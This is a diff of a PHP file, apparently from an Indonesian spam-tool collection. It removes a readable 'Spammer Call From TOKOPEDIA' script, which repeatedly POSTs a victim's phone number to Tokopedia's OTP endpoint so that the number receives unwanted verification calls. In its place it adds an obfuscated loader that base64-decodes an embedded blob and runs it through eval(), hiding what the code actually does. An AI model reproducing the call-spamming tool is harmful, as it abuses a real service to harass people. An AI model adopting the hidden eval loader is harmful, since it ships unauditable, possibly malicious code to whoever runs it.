@@ -1,24 +1,4 @@
 <?php
-// Limit 3x Telpon Setiap Satu Nomor
-function send($phone){
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_HEADER, true);
-        curl_setopt($ch, CURLOPT_POST, 1);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        $asw = curl_exec($ch);
-        curl_close($ch);
-                echo $asw."\n";
-}
-echo "
-############################################################
-    Spammer Call From TOKOPEDIA
-        Author By   : Gabriel.S
-     Penggunaannya  : Bisa Menggunakan [08/62]
-###########################################################\n";
-echo "Nomor\nInput : ";
-$nomor = trim(fgets(STDIN));
-$execute = send($nomor);
-print $execute;
+#encrypt by Kevin Leo.S
+$SISTEMIT_COM_ENC = "3da5Cq1KFgDQvKF/4vKCfhg4Tzxu4DzP09HkgYIHnFATh/96HySCwREDAyMR+tyb9S90UlBQexW192ZT//7XH57i+YKh+H9zlvG3YHL//PznB3pe+NSNijTkQy6xK9ZwnOTMmTlgzWV+aJQ8S8cQJJP2SjhfL27UWYcXBoNVD6BBZnK8gE3juxB+2QwIdDYIYkSwWxNSewAF+pBNHrR1gw8I0m8XY5H0okce8MIpHkLYSX3KvhfFzDJRJcsPIsoVhloYiB7ilLmVluSWEM9I0y10Hh+jJaIJOgA2eddFOr+fUIrYhQpaQ5JqrfP8nSycZROH4/32hpRzKitQKOCeg1HPRthFj/TwCf6WSyBMsSBnjC4iJB/VW0GHDYSyWjZIoXoWP7NriLDGkiBSp/C76ZX7lObKI06wUzxrpbVjC5DRzr3DIvL6mGVTO6cQ8FTxSUpIJgrjQ/WjfuYtnMvm6SAfRGpvv5Wlj4oD9U2SgIaszRxRh0DwJqc9OY85VRjxg6FFlYFFdUAnfdTNI6vUxVC9Yx9X/FtFNW7apboJIkXYBkmQTuhmORuZraZrfUN6+YQmVK/ODpSINX08j9a3vxo8Z9QbDFtxJHRy1EucmROXKHU7dJ1Ll64baxGO2BvUZGtmRM7Kg8v6k/qvIr9K43HopsEsH8BCd/qW7WNv4U43gohYyxuE9mAxcMeG3rHEpc05Cf6oQOhOZ9g8iTT3KaeT9dlctGRBFXS9sOtIpQ5KSLx0QnlCOhSTlyRJpDIMqaF5hzz3VeVWn1RUbTCIYcaoe/pW8Dhj5tyMHCoJYulvhtfuIBgl3hRybpQVUsxvoXWGL8yYGU+zEJmO0c5xMP0JXhLUWoQgnoAKjOnib85pK2rCzR0RWgRUFAgKN9UG3os4VFvf7BPxfhueTYmBC4R6/OLf4v32eIs0Rrhwx1bhe3+yh03x8OabwJ5ujFfBa5QetSVQU3bnpEGixRfR7r5rqwmxDLyay4arJseFyvfLiBkw3kgg/0R+ap23v6zTBQGrzqvSY/FhmR3NUM4UDvX3S6BUX7pQGH7C+YNiQUXOrAXvd2LiU+xAzEfJMouXtFtYlRS/EdKSOTYq9W29hbEh22eKyE0FeEg8iUzVBMwya2Go1ZkonHbkX9u2MGYHdyr++SxSdOfVjmgjUnM9bsKWQIY3C4cZlzJTNAzbJSlWhslijhAd4fE1L/rXzsN9y/aPsCgw1j97M6aKcaUjg8gfJsqr9Imox4cFBY4ycxxubdnwyaMR7o6GbtKuaueaOU6lD0lGRXge70RjrWpnQK2BEbhz40vr/NaVYLG00jZAgo2PMy+VM64vKoBO2GC4YULMTULpolw/FN8arO67FPt8e0leLnpf4ktZjJTcQH1H6UdPLm3UgXFa6nsmj9v6+rBIUomNc9sqEurWytUjh+NFhGduzSuoXoZyH57xp4HtnmWg7sI8pdVs+LGHyUNh/Rhj7cUFMYIT/dGvomEJDI7hFDhOa3cvPO6yWlYvF62EDgUhcfVsb6N9awCkqvI57XnToU9rxpU0wM9ohsCt535FcxJCJ6/NntgqWdbFmLEjnLxU64W2cqArfLFSKYI7tfcekQpEpYDNnRI+45RL2bc2cKSuVcx3WMXFLFRcNKsXvGczf9XACzuZs3Eq/X7hioGv4zm3Otu6iuHIdFHwo8rLDr2upM/zd5gLGNEqkxgbhHNFR5HFDA3i8m4EsScIMk7VNoS2mCIrWnQucm3Xe7DKtN87wrJ44Tu1jlHjAHlP93y5EUwCQr6j/XOJy1GI0519EUQFGPiCTsloDK8Z9GrYjaElgsYent1Ivy3g4AtwfPn883aONjuKznqZ/AvZLOytOktFREhAdf0VNr2BwT4Oc4KZlnySYIws08Lk4xVnpC4feKs+sOXAcWw4P4rzHf5s/EDXqErtUT1GxZXvznWtRWUYn9XyeSSQE4W3/MHFYWWep1lNvV1tksBcp82ZFonJuko5IxKesm0Yb7qs3CA8kRTAnSxfLEbAr/H6Nr8ERFOJMj2BRwgx3hiJhzeJe2Ms70hLihTtNrzZ3wSOHsOrZHpxG1GV0MzXg47RlSJQqnsPE4MCM+FMA0OfKrT3ljApyMKH2o5uH7aXu0YYeJpL+YDtN32VB70eVqdZhTZPQBUCPXQf8yzo1QDl/uqkLe0s85G9oVRcsmwQCEeRm0cZKbAiP58GiChQ00F6cDkg1x+S3rcTBDWYeIqJI1CMfj/9dz6dRlnj91QL2yxN2kI0xiwG21cYBzGHD+KxCVCr2qGbDwMEP20OCN4B4HV6kZyRz3OTQeAoHL35rl9YQFEYHh0BQLTHxrXsmgCNIoNJBKjie7DTBWlo8EELEgZfeZKAYASQT/VgNA2AedGtcU4CVA5ONFiMBEWB4Nv4+eOvP/qrOX+m13YT2N/nnS3n/Z8fXpnBl+S2jl+pLuIgcZjBaaTKbsFeAXK0UXhYqYB3QZ1cLpx0caF6qfDhg8r1wxIPgyoYvSqRrMANDF6sv3vYFT7+NZ9CENGaA4v9hRhz0Hx9nm1CtKqNoMVPBEPuyJy9/fNt0pFPilO7X+dqimaRQcvjRrjhIMnHayo0LU4/Rk1Nn9nVF8w6+x2PQwHilj6aDR5kuhfUap7QonF5mgnMRhmCJwHy9Qu1/+3z4m8/qn77kyX98t3+t1+b+C/fqM9ffmmUv/3S+RXfVGxaHUEG4XyCfDQvMNkEqvigCZNIrJpANLm7dhWvToo0TH7dL11V63/PFgas4l/P+75TvqXWcGAV/uYzyQQaNX7lMPp8vzzHdUnqL3tPg3jyYHe2nZ8/f/z51/1c1X/+t1y/S/jnn3/94fmW/fPH/8vf9cdf//7XfwE=";$rand=base64_decode("Skc1aGRpQTlJR2Q2YVc1bWJHRjBaU2hpWVhObE5qUmZaR1ZqYjJSbEtDUlRTVk5VUlUxSlZGOURUMDFmUlU1REtTazdEUW9KQ1Fra2MzUnlJRDBnV3lmMUp5d242eWNzSitNbkxDZjdKeXduNFNjc0ovRW5MQ2ZtSnl3bjdTY3NKLzBuTENmcUp5d250U2RkT3cwS0NRa0pKSEp3YkdNZ1BWc25ZU2NzSjJrbkxDZDFKeXduWlNjc0oyOG5MQ2RrSnl3bmN5Y3NKMmduTENkMkp5d25kQ2NzSnlBblhUc05DZ2tKSUNBZ0lDUnVZWFlnUFNCemRISmZjbVZ3YkdGalpTZ2tjM1J5TENSeWNHeGpMQ1J1WVhZcE93MEtDUWtKWlhaaGJDZ2tibUYyS1RzPQ==");eval(base64_decode($rand));$STOP="FgDQvKF/4vKCfhg4Tzxu4DzP09HkgYIHnFATh/96HySCwREDAyMR+tyb9S90UlBQexW192ZT//7XH57i+YKh+H9zlvG3YHL//PznB3pe+NSNijTkQy6xK9ZwnOTMmTlgzWV+aJQ8S8cQJJP2SjhfL27UWYcXBoNVD6BBZnK8gE3juxB+2QwIdDYIYkSwWxNSewAF+pBN";
 ?>
